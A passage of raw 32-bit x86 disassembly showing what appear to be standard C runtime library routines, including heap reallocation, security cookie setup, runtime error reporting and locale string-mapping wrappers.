  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
